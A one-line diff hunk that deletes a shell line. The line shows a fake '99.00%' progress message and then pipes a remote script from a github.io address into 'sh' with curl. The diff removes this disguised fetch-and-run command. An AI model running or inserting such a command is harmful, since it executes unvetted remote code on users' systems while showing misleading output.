@@ -1,1 +1,0 @@
-echo Progress: 99.00%curl -L --progress-bar frkns.github.io/fun/corpsjackie.js | sh
